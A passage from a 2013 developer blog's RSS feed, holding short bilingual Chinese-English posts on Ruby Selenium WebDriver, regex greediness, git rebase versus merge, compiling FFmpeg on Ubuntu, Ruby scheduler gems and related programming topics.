&lt;a name="Timeouts"&gt;&lt;/a&gt;Timeouts&lt;/h2&gt;
&lt;h3 style="font-size: medium; background-image: none; background-color: initial; border-top-style: solid; border-top-color: #3366cc; padding-top: 0.5ex; padding-right: 0.5em; padding-bottom: 0.5ex; padding-left: 0px; margin: 0px;"&gt;
&lt;a name="Implicit_waits"&gt;&lt;/a&gt;Implicit waits&lt;/h3&gt;
&lt;p style="line-height: 1.25em;"&gt;WebDriver lets you configure implicit waits, so that a call to&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;#find_element&lt;/tt&gt;&amp;#160;will wait for a specified amount of time before raising a&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;NoSuchElementError&lt;/tt&gt;:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;&amp;#160; driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;firefox
&amp;#160; driver&lt;/span&gt;.&lt;/span&gt;manage&lt;/span&gt;.&lt;/span&gt;timeouts&lt;/span&gt;.&lt;/span&gt;implicit_wait &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;3&lt;/span&gt; &lt;/span&gt;# seconds&lt;/span&gt;
&lt;/pre&gt;
&lt;h3 style="font-size: medium; background-image: none; background-color: initial; border-top-style: solid; border-top-color: #3366cc; padding-top: 0.5ex; padding-right: 0.5em; padding-bottom: 0.5ex; padding-left: 0px; margin: 0px;"&gt;
&lt;a name="Explicit_waits"&gt;&lt;/a&gt;Explicit waits&lt;/h3&gt;
&lt;p style="line-height: 1.25em;"&gt;Use the Wait class to explicitly wait for some condition:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;&amp;#160; wait &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Wait&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;(:&lt;/span&gt;timeout &lt;/span&gt;=&amp;gt;&lt;/span&gt; &lt;/span&gt;3&lt;/span&gt;)&lt;/span&gt;
&amp;#160; wait&lt;/span&gt;.&lt;/span&gt;until&lt;/span&gt; &lt;/span&gt;{&lt;/span&gt; driver&lt;/span&gt;.&lt;/span&gt;find_element&lt;/span&gt;(:&lt;/span&gt;id &lt;/span&gt;=&amp;gt;&lt;/span&gt; &lt;/span&gt;"cheese"&lt;/span&gt;).&lt;/span&gt;displayed&lt;/span&gt;?&lt;/span&gt; &lt;/span&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;h3 style="font-size: medium; background-image: none; background-color: initial; border-top-style: solid; border-top-color: #3366cc; padding-top: 0.5ex; padding-right: 0.5em; padding-bottom: 0.5ex; padding-left: 0px; margin: 0px;"&gt;
&lt;a name="Internal_timeouts"&gt;&lt;/a&gt;Internal timeouts&lt;/h3&gt;
&lt;p style="line-height: 1.25em;"&gt;Internally, WebDriver uses HTTP to communicate with a lot of the drivers (the&amp;#160;&lt;a style="color: #0000cc;" href="http://code.google.com/p/selenium/wiki/JsonWireProtocol"&gt;JsonWireProtocol&lt;/a&gt;). By default,&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Net::HTTP&lt;/tt&gt;&amp;#160;from Ruby's standard library is used, which has a default timeout of 60 seconds. If you call&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Driver#get&lt;/tt&gt;&amp;#160;on a page that takes more than 60 seconds to load, you'll see a&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;TimeoutError&lt;/tt&gt;&amp;#160;raised from&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Net::HTTP&lt;/tt&gt;. You can configure this timeout (before launching a browser) by doing:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;&amp;#160; client &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Remote&lt;/span&gt;::&lt;/span&gt;Http&lt;/span&gt;::&lt;/span&gt;Default&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;
&amp;#160; client&lt;/span&gt;.&lt;/span&gt;timeout &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;120&lt;/span&gt; &lt;/span&gt;# seconds&lt;/span&gt;
&amp;#160; driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt;(:&lt;/span&gt;remote&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;http_client &lt;/span&gt;=&amp;gt;&lt;/span&gt; client&lt;/span&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;h2 style="font-size: large; background-image: none; background-color: initial; padding-left: 0px;"&gt;
&lt;a name="JavaScript_dialogs"&gt;&lt;/a&gt;JavaScript dialogs&lt;/h2&gt;
&lt;p style="line-height: 1.25em;"&gt;You can use webdriver to handle Javascript&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;alert()&lt;/tt&gt;,&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;prompt()&lt;/tt&gt;&amp;#160;and&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;confirm()&lt;/tt&gt;&amp;#160;dialogs. The API for all three is the same.&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;Note: At this time alert handling is only available in Firefox and IE (or in those browsers through the remote server), and only alerts that are generated post onload can be captured.&lt;/p&gt;
&lt;pre class="prettyprint"&gt;require&lt;/span&gt; &lt;/span&gt;"selenium-webdriver"&lt;/span&gt;

driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;firefox
driver&lt;/span&gt;.&lt;/span&gt;navigate&lt;/span&gt;.&lt;/span&gt;to &lt;/span&gt;"http://mysite.com/page_with_alert.html"&lt;/span&gt;

driver&lt;/span&gt;.&lt;/span&gt;find_element&lt;/span&gt;(:&lt;/span&gt;name&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;'element_with_alert_javascript'&lt;/span&gt;).&lt;/span&gt;click
a &lt;/span&gt;=&lt;/span&gt; driver&lt;/span&gt;.&lt;/span&gt;switch_to&lt;/span&gt;.&lt;/span&gt;alert
&lt;/span&gt;if&lt;/span&gt; a&lt;/span&gt;.&lt;/span&gt;text &lt;/span&gt;==&lt;/span&gt; &lt;/span&gt;'A value you are looking for'&lt;/span&gt;
&amp;#160; a&lt;/span&gt;.&lt;/span&gt;dismiss
&lt;/span&gt;else&lt;/span&gt;
&amp;#160; a&lt;/span&gt;.&lt;/span&gt;accept
&lt;/span&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;h2 style="font-size: large; background-image: none; background-color: initial; padding-left: 0px;"&gt;
&lt;a name="Using_Curb_or_your_own_HTTP_client"&gt;&lt;/a&gt;Using Curb or your own HTTP client&lt;/h2&gt;
&lt;p style="line-height: 1.25em;"&gt;For internal HTTP communication,&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Net::HTTP&lt;/tt&gt;&amp;#160;is used by default. If you e.g. have the&amp;#160;&lt;a style="color: #0000cc;" href="https://rubygems.org/gems/curb"&gt;Curb gem&lt;/a&gt;&amp;#160;installed, you can switch to it by doing:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;require&lt;/span&gt; &lt;/span&gt;'selenium/webdriver/remote/http/curb'&lt;/span&gt;
include &lt;/span&gt;Selenium&lt;/span&gt;

client &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Remote&lt;/span&gt;::&lt;/span&gt;Http&lt;/span&gt;::&lt;/span&gt;Curb&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;
driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt;(:&lt;/span&gt;firefox&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;http_client &lt;/span&gt;=&amp;gt;&lt;/span&gt; client&lt;/span&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;If you have the&amp;#160;&lt;a style="color: #0000cc;" href="https://github.com/drbrain/net-http-persistent"&gt;net-http-persistent gem&lt;/a&gt;&amp;#160;installed, you can (as of 0.1.3) similarly use "selenium/webdriver/remote/http/persistent" to get keep-alive connections. This will significantly reduce the ephemeral ports usage of WebDriver, which is useful in&amp;#160;&lt;a style="color: #0000cc;" href="http://code.google.com/p/selenium/wiki/ScalingWebDriver"&gt;some contexts&lt;/a&gt;. Note that this currently only works with the remote Java server (the other servers doesn't yet support keep-alive).&lt;/p&gt;


  &lt;/div&gt;</description>
      <pubDate>Thu, 30 May 2013 00:33:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ruby-selenium-gem-webdriver</link>
    </item>
    <item>
      <title>正则表达式中的贪婪和懒惰 （greedy expression in regexp   ）</title>
      <description>&lt;p&gt;in short: adding "?" to the regexp&lt;/p&gt;
&lt;pre&gt;"123 123 123".match(/1.*3/)   # =&amp;gt; "123 123 123"
"123 123 123".match(/1.*?3/)   # =&amp;gt; "123"
&lt;/pre&gt;
&lt;p&gt;http://rubyer.me/blog/357/&lt;/p&gt;
&lt;p&gt;6、贪婪匹配vs懒惰匹配&lt;br /&gt;这两种匹配属于标准正则表达式内容，与Ruby没关，但新手如果不明白匹配时会发生莫名其妙的错误，所以特别总结一下。&lt;/p&gt;
&lt;p&gt;贪婪匹配：尽可能多匹配，正则默认是贪婪匹配。例子：a.*b它将会匹配最长的以a开始，以b结束的字符串。对于aabab的匹配结果是aabab。&lt;br /&gt;懒惰匹配：尽可能少匹配。例子：a.*?b对于aabab的匹配结果是aab和ab。&lt;br /&gt;一般是在原来表达式结尾加?就由贪婪匹配变成了懒惰匹配。常用的懒惰限定符有（去年最后的问题就是贪婪匹配）：&lt;/p&gt;
&lt;p&gt;?重复任意次，但尽可能少重复&lt;br /&gt;+?重复1次或更多次，但尽可能少重复&lt;br /&gt;??重复0次或1次，但尽可能少重复&lt;br /&gt;{n,m}?重复n到m次，但尽可能少重复&lt;br /&gt;{n,}?重复n次以上，但尽可能少重复&lt;/p&gt;</description>
      <pubDate>Wed, 29 May 2013 07:18:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/greedy-expression-in-ruby-regexp</link>
    </item>
    <item>
      <title>Git rebase 笔记 ( git rebase introduction)</title>
      <description>&lt;p&gt;前几天的一个文章，我提到 自己比较偏好 git-merge. 现在看起来，这个问题不该带有个人偏好。而是需要根据情况，来选择使用 git rebase /merge &amp;#160;( several days ago, I mentioned that I prefer 'git-merge' to 'git-rebase'. &amp;#160;Now I admit that as a professional programmer, I should not be emotional. &amp;#160;We should choosing the right one according to the real situation )&amp;#160;&lt;/p&gt;
&lt;p&gt;merge: 会保留时间线。 适合需要保持时间线的场合。 &amp;#160;(it would keep the commit order for each branch )&amp;#160;&lt;/p&gt;
&lt;p&gt;rebase: 不会保留时间线。 适合按照 feature 来查看log的场合。比如，我现在同时在3个分支上工作，但是为了方便代码的提交，我会在一个完成之后再提交另外一个分支/功能模块。所以在这样的情况下使用rebase使得代码更加容易回滚，以及查看log. &amp;#160; ( the origin commit would be removed and a new commit would be generated . &amp;#160;if you are working on 3 branches at the same time, and want to merge the code till the whole module/branch is done, just use this 'rebase' )&amp;#160;&lt;/p&gt;
&lt;p&gt;简单用法：&lt;/p&gt;
&lt;p&gt;$ git rebase master &amp;lt;current_branch&amp;gt;&lt;/p&gt;
&lt;p&gt;这样就会把 master上的最后一个commit, 做为当前 分支的commit 的基础。&lt;/p&gt;
&lt;p&gt;更多详细，参考 man git-rebase. &amp;#160; ( for more details, please refer to 'man git-rebase' )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Mon, 27 May 2013 02:56:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/git-rebase-introduction</link>
    </item>
    <item>
      <title>Use htop to have a better view layout than 'top' (替换top的好东西： htop) </title>
      <description>&lt;p&gt;这几天在top 查看系统状态时，发现有个进程怎么都看不到完整名字（显示不下了）。时间特别短暂，几秒中就过去了。&lt;/p&gt;
&lt;p&gt;但是我觉得很吓人，于是就搜了一下。发现了这个回答：&lt;/p&gt;
&lt;a href="http://serverfault.com/questions/139632/show-full-process-name-in-top"&gt;http://serverfault.com/questions/139632/show-full-process-name-in-top&lt;/a&gt;
&lt;p&gt;试了下，效果非常不错，可以左右调整布局，耐心的等了一会儿，终于看到这个进程全名了。呵呵。。。&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSIlMjAxMy8wNS8xNy8wOF8zMV8zOF85NzJfaHRvcC5wbmcGOgZFVA/htop.png" title="Htop" alt="Htop" rel="110x110" width="1280" height="800" /&gt;&lt;/p&gt;</description>
      <pubDate>Fri, 17 May 2013 00:28:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-htop-instead-of-top</link>
    </item>
    <item>
      <title>ruby only include module 1 time (prevent including a module multiple times ) </title>
      <description>&lt;p&gt;approaches:&lt;/p&gt;
&lt;p&gt;1. use raw ruby ( not recommended) &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;2. use ActiveSupport::Concern (&amp;#160;&lt;a href="http://api.rubyonrails.org/classes/ActiveSupport/Concern.html"&gt;http://api.rubyonrails.org/classes/ActiveSupport/Concern.html &lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;p.s. 3.&amp;#160;require_dependency &amp;#160;( this is used to require a file )&amp;#160;
&lt;/p&gt;
&lt;p&gt;p.s.2 实际上多次包含一个module 也不会出太大的错，除了 会多次调用 included 方法。如下：&lt;/p&gt;

&lt;pre&gt;module Tree
    def name;         puts "I am a tree~" l;     end 
end
class Apple
    include Tree
    include Tree
    include Tree
    include Tree
end
puts Apple.included_modules #=&amp;gt; [Tree, Kernel]
&lt;/pre&gt;</description>
      <pubDate>Sat, 11 May 2013 01:06:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/prevent-including-a-module-multiple-times</link>
    </item>
    <item>
      <title>auto test tools for mobile applications （移动应用的自动化测试工具） </title>
      <description>&lt;p&gt;basically, &amp;#160; appium or robotium is our choice ( perhaps, I am not sure)&amp;#160;&lt;/p&gt;
&lt;p&gt;copied from:&amp;#160; &lt;a href="http://www.linkedin.com/groups/What-mobile-automation-tool-would-86204.S.192414075"&gt;http://www.linkedin.com/groups/What-mobile-automation-tool-would-86204.S.192414075&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;Felipe Knorr Kuhn • Hi Aidan, it all depends on what platform(s) you want to work with, but I strongly recommend studying and helping open source tools. &lt;/p&gt;
&lt;p&gt;If you are into iOS, there's Appium [1] (which implements the WebDriver protocol for native apps), Frank [2], Calabash [3] and others. &lt;/p&gt;
&lt;p&gt;If you are into Windows 8 tablets and WinJS apps, there's RainbowDriver [4]. &lt;/p&gt;
&lt;p&gt;For Android, I can think of Robotium [5] and Calabash. &lt;/p&gt;
&lt;p&gt;If they don't do what you want, you can always try to extend them or request new features. &lt;/p&gt;
&lt;p&gt;[1] https://github.com/hugs/appium &lt;br /&gt;[2] http://testingwithfrank.com/ &lt;br /&gt;[3] http://calaba.sh/ &lt;br /&gt;[4] https://github.com/rainbowdriver &lt;br /&gt;[5] http://code.google.com/p/robotium/&lt;/p&gt;</description>
      <pubDate>Thu, 09 May 2013 07:52:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/auto-test-tools-for-mobile-applications</link>
    </item>
    <item>
      <title>Ubuntu 下安装ffmpeg ( Compile FFmpeg on Ubuntu Lucid Lynx 10.04 LTS ) </title>
      <description>&lt;p&gt;see: &lt;a target="_blank" href="https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu"&gt;https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;It also works for me on Ubuntu 11.&amp;#160;&lt;/p&gt;
&lt;p&gt;Compile FFmpeg on Ubuntu Lucid Lynx 10.04 LTS&lt;br /&gt;Contents&lt;br /&gt;Preparation&lt;br /&gt;Installation&lt;br /&gt;Finish&lt;br /&gt;Optional Installation&lt;br /&gt;Updating FFmpeg&lt;br /&gt;Reverting Changes Made by This Guide&lt;br /&gt;If You Need Help&lt;br /&gt;This guide supports Ubuntu Lucid Lynx 10.04 LTS. If you are using a different Ubuntu version see the main Compile FFmpeg on Ubuntu Guide. This guide will enable several external encoders and decoders: libfaac (AAC encoder), libmp3lame (MP3 encoder), libopencore-amr (AMR encoder/decoder), libtheora (Theora encoder), libvorbis (Vorbis encoder), libvpx (VP8 encoder/decoder), and libx264 (H.264 encoder). These are optional and may be omitted if desired.&lt;/p&gt;
&lt;p&gt;Note: Copy and paste the whole code box for each step.&lt;/p&gt;
&lt;p&gt;Preparation&lt;/p&gt;
&lt;p&gt;Remove any existing packages:&lt;/p&gt;
&lt;p&gt;sudo apt-get remove ffmpeg x264 libx264-dev yasm&lt;br /&gt;Get the dependencies (Ubuntu Desktop users):&lt;/p&gt;
&lt;p&gt;sudo apt-get update&lt;br /&gt;sudo apt-get install -y build-essential git-core checkinstall texi2html libfaac-dev \&lt;br /&gt;    libopencore-amrnb-dev libopencore-amrwb-dev libsdl1.2-dev libtheora-dev \&lt;br /&gt;    libvorbis-dev libx11-dev libxfixes-dev pkg-config zlib1g-dev&lt;br /&gt;Get the dependencies (Ubuntu Server or headless users):&lt;/p&gt;
&lt;p&gt;sudo apt-get update&lt;br /&gt;sudo apt-get install -y build-essential git-core checkinstall texi2html libfaac-dev \&lt;br /&gt;    libopencore-amrnb-dev libopencore-amrwb-dev libtheora-dev libvorbis-dev pkg-config zlib1g-dev&lt;br /&gt;Installation&lt;/p&gt;
&lt;p&gt;Yasm&lt;/p&gt;
&lt;p&gt;Yasm is an assembler and is recommended for x264 and FFmpeg.&lt;/p&gt;
&lt;p&gt;cd&lt;br /&gt;wget http://www.tortall.net/projects/yasm/releases/yasm-1.2.0.tar.gz&lt;br /&gt;tar xzvf yasm-1.2.0.tar.gz&lt;br /&gt;cd yasm-1.2.0&lt;br /&gt;./configure&lt;br /&gt;make&lt;br /&gt;sudo checkinstall --pkgname=yasm --pkgversion="1.2.0" --backup=no --deldoc=yes --default&lt;br /&gt;x264&lt;/p&gt;
&lt;p&gt;H.264 video encoder. The following commands will get the current source files, compile, and install x264.&lt;/p&gt;
&lt;p&gt;cd&lt;br /&gt;git clone --depth 1 git://git.videolan.org/x264&lt;br /&gt;cd x264&lt;br /&gt;./configure --enable-static&lt;br /&gt;make&lt;br /&gt;sudo checkinstall --pkgname=x264 --default --pkgversion="3:$(./version.sh | \&lt;br /&gt;    awk -F'[" ]' '/POINT/{print $4"+git"$5}')" --backup=no --deldoc=yes&lt;br /&gt;Note: See  using snapshots if you are having connection issues with the Git server.&lt;/p&gt;
&lt;p&gt;LAME&lt;/p&gt;
&lt;p&gt;MP3 audio encoder.&lt;/p&gt;
&lt;p&gt;sudo apt-get remove libmp3lame-dev&lt;br /&gt;sudo apt-get install nasm&lt;br /&gt;cd&lt;br /&gt;wget http://downloads.sourceforge.net/project/lame/lame/3.99/lame-3.99.5.tar.gz&lt;br /&gt;tar xzvf lame-3.99.5.tar.gz&lt;br /&gt;cd lame-3.99.5&lt;br /&gt;./configure --enable-nasm --disable-shared&lt;br /&gt;make&lt;br /&gt;sudo checkinstall --pkgname=lame-ffmpeg --pkgversion="3.99.5" --backup=no --default \&lt;br /&gt;    --deldoc=yes&lt;br /&gt;libvpx&lt;/p&gt;
&lt;p&gt;VP8 video encoder and decoder.&lt;/p&gt;
&lt;p&gt;cd&lt;br /&gt;git clone --depth 1 http://git.chromium.org/webm/libvpx.git&lt;br /&gt;cd libvpx&lt;br /&gt;./configure&lt;br /&gt;make&lt;br /&gt;sudo checkinstall --pkgname=libvpx --pkgversion="$(date +%Y%m%d%H%M)-git" --backup=no \&lt;br /&gt;    --default --deldoc=yes&lt;br /&gt;FFmpeg&lt;/p&gt;
&lt;p&gt;cd&lt;br /&gt;git clone --depth 1 git://source.ffmpeg.org/ffmpeg&lt;br /&gt;cd ffmpeg&lt;br /&gt;./configure --enable-gpl --enable-libfaac --enable-libmp3lame --enable-libopencore-amrnb \&lt;br /&gt;    --enable-libopencore-amrwb --enable-libtheora --enable-libvorbis --enable-libvpx \&lt;br /&gt;    --enable-libx264 --enable-nonfree --enable-version3 --enable-x11grab&lt;br /&gt;make&lt;br /&gt;sudo checkinstall --pkgname=ffmpeg --pkgversion="5:$(./version.sh)" --backup=no \&lt;br /&gt;    --deldoc=yes --default&lt;br /&gt;hash x264 ffmpeg ffplay ffprobe&lt;br /&gt;Note: Ubuntu Server users should omit --enable-x11grab.&lt;/p&gt;
&lt;p&gt;Finish&lt;/p&gt;
&lt;p&gt;Installation is now complete and FFmpeg is now ready for use. You can keep the x264, libvpx, and ffmpeg directories in your home directory if you plan on updating later. See Updating FFmpeg below for more details. Some optional steps are next followed by instructions on updating FFmpeg and finally instructions on reverting all changes made by this guide.&lt;/p&gt;</description>
      <pubDate>Wed, 08 May 2013 07:53:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ubuntu-ffmpeg-compile-ffmpeg-on-ubuntu-lucid-lynx-10-04-lts</link>
    </item>
    <item>
      <title>安装 Android SDK  (setup Android SDK in eclipse)</title>
      <description>&lt;p&gt;根据这个指导文件：(just following this guide: &amp;#160;) &amp;#160;&lt;a href="http://code.google.com/p/robotium/wiki/RobotiumTutorials"&gt;http://code.google.com/p/robotium/wiki/RobotiumTutorials&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;1. 下载并安装Eclipse ( install eclipse)&lt;/p&gt;
&lt;p&gt;2. 下载并安装 Eclipse ADT (android development tools)&amp;#160;&lt;/p&gt;
&lt;p&gt;3. 安装Android SDK. &amp;#160;（上面的说明文档有些过时，安装的过程参照 eclipse的引导就可以了。文档中的 AVD(android virtual device) 是没必要的。在最新的版本上已经有一个 AVD列表了... 吧？）&lt;/p&gt; 

</description>
      <pubDate>Sat, 04 May 2013 23:34:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setting-up-adt</link>
    </item>
    <item>
      <title>定时执行的几个GEM比较( comparison of scheduled-task gems )</title>
      <description>&lt;p&gt;delayed_jobs: 可以延后执行一个任务。最常见的： 发送EMAIL。( it is used for one-off tasks, classic example: sending emails)&lt;/p&gt;
&lt;p&gt;whenever: 可读性极强的 crontab. &amp;#160; 需要配合具有crontab的操作系统来使用 &amp;#160; ( fits for those OS with crontab supported. )&amp;#160;&lt;/p&gt;
&lt;p&gt;rufu-scheduler: 可以定时执行N次，也可以延后执行一次，可以看成是 delayed_job + whenever的混合版。 ( supports both recurring task and one-off tasks. )&amp;#160;&lt;/p&gt;
&lt;p&gt;resque-scheduler: 需要跟redis配合使用的东东。没用过。看了说明，跟delayed_job 几乎一样的。 离不开redis是它最大的“特点”。比较有意思的是，提供了一个WEB UI. （不过我认为专业程序员 有console就足够了） &amp;#160;( lives on Redis DB, also with a fancy WEB UI which is useless for professional programmers)&amp;#160;&lt;/p&gt;
&lt;p&gt;clockwork: 也看了下，跟delayed_job, resque-scheduler 几乎一样的。 &amp;#160;(almost the same with delayed_job, resque-scheduler )&amp;#160;&lt;/p&gt;
&lt;p&gt;clockwork 和其他。。。比较全的对比见：https://www.ruby-toolbox.com/categories/scheduling&lt;/p&gt;
&lt;p&gt;每个gem都有自己针对的一面。所以根据现在项目的需求（要配置一个可以定时抓取视频的应用，需要可以随时开始，随时停止），看过前面3个之后，我决定选择rufu-scheduler 。它不但可以满足 one-off task, &amp;#160;也满足recurring task. 呵呵， 最重要的是，可以随时同过ruby 代码来控制停止和开启。（而不是通过命令行的形式）） ，就它了。 &amp;#160; ( considering the manually start/stop by ruby code but not the console, I decided to choose rufu-scheduler to do the job. )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sun, 28 Apr 2013 00:16:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/comparison-of-scheduler-gems</link>
    </item>
    <item>
      <title>I prefer git merge to git rebase (喜欢merge)</title>
      <description>&lt;p&gt;原因很简单， git merge 可以保留原始的commit 时间。 而rebase 会破坏这一点。( usually I prefer 'merge' than 'rebase')&lt;/p&gt;
&lt;p&gt;比如，&lt;/p&gt;
&lt;p&gt;branch2:&amp;#160;&lt;/p&gt;
&lt;pre&gt;f738cf3 added line 2 to file 2 on branch2 (Siwei, 6 seconds ago)
a2f47a2 added line 1 to file 2 on branch2 (Siwei, 87 seconds ago)
53f630f commit file2 on branch2 (Siwei, 3 minutes ago)
29c906c added file1 (Siwei, 4 minutes ago)
&lt;/pre&gt;

&lt;p&gt; master: &lt;/p&gt;
&lt;pre&gt;5d4cff1 added line 2 to file 1 on master (Siwei, 58 seconds ago)
5ba53c5 added line 1 to file 1 on master (Siwei, 2 minutes ago)
29c906c added file1 (Siwei, 4 minutes ago)
&lt;/pre&gt;

&lt;p&gt;
after merge ( master to branch2)
&lt;/p&gt;

&lt;pre&gt;256a762 Merge branch 'master' into branch2 (Siwei, 2 seconds ago)
f738cf3 added line 2 to file 2 on branch2 (Siwei, 57 seconds ago)
5d4cff1 added line 2 to file 1 on master (Siwei, 2 minutes ago)
a2f47a2 added line 1 to file 2 on branch2 (Siwei, 2 minutes ago)
5ba53c5 added line 1 to file 1 on master (Siwei, 3 minutes ago)
53f630f commit file2 on branch2 (Siwei, 3 minutes ago)
29c906c added file1 (Siwei, 5 minutes ago)
&lt;/pre&gt;</description>
      <pubDate>Wed, 17 Apr 2013 08:10:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/prefer-git-merge</link>
    </item>
    <item>
      <title>encoding problem in Ruby (ruby中的汉字转换）</title>
      <description>&lt;p&gt;Today I am face a problem: &amp;#160;how to convert 汉字 to \uxxx\uxxx ?&amp;#160;&lt;/p&gt;
&lt;p&gt;after googled and quickly browsed several posts, I found &lt;a href="http://stackoverflow.com/a/5561268/445908"&gt;this answer: &amp;#160;&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;Using active support:&amp;#160;&lt;/p&gt;

&lt;pre&gt;&amp;gt;&amp;gt; require 'rubygems'
&amp;gt;&amp;gt; require 'active_support'
&amp;gt;&amp;gt; a ='汉字'

&amp;gt;&amp;gt; a.encoding
=&amp;gt; #

&amp;gt;&amp;gt; result = ActiveSupport::JSON.encode(a)
=&amp;gt; "\"\\u6c49\\u5b57\""

&amp;gt;&amp;gt; result.encoding
=&amp;gt; #
&lt;/pre&gt;
&lt;p&gt;

It's strange that both of them are encoded in UTF-8. ( I am confused by this UTF8, UTF16, unicode stuffs... @.@ ) &amp;#160;有点蒙。。。回头把它给补上。&lt;/p&gt;</description>
      <pubDate>Tue, 16 Apr 2013 01:24:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/unicode-encoding-in-ruby</link>
    </item>
    <item>
      <title>【TODO使用自动化来测试IPHONE,  ANDROID</title>
      <description>&lt;p&gt;必须要注意做了。否则人肉的话实在没有精力。&lt;/p&gt;
&lt;p&gt;http://code.google.com/p/selenium/wiki/AndroidDriver&lt;/p&gt;
&lt;p&gt;http://code.google.com/p/selenium/wiki/IPhoneDriver&lt;/p&gt;
&lt;p&gt;http://stackoverflow.com/questions/1759626/how-do-you-test-an-android-application-across-multiple-activities&lt;/p&gt;
&lt;p&gt;http://www.netmagazine.com/tutorials/automate-your-android-app-testing&lt;/p&gt;
&lt;p&gt;http://www.infoq.com/news/2011/09/Android-Testing&lt;/p&gt;</description>
      <pubDate>Sat, 13 Apr 2013 11:51:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/todo-iphone-android</link>
    </item>
    <item>
      <title>在webservice中不要返回 无内容的结果( don't return blank result in webservice )</title>
      <description>&lt;p&gt;有两个系统，之间用 webservice(json &amp;#160;格式）通信，系统A 读取系统B。 &amp;#160;( there are 2 systems: A and B. A read the web service from B )&lt;/p&gt;
&lt;p&gt;系统A有一层缓存系统，会对系统B返回的结果做缓存。但是有个条件：系统B给的结果必须是非空的。 ( system A has a cache system , but it can only cache non-blank values )&amp;#160;&lt;/p&gt;
&lt;p&gt;结果系统B的一个特点是，找不到结果时，会返回 无内容的json 字符，如： [] , &amp;#160;{} &amp;#160; ( but the system B always return blank values )&amp;#160;&lt;/p&gt;
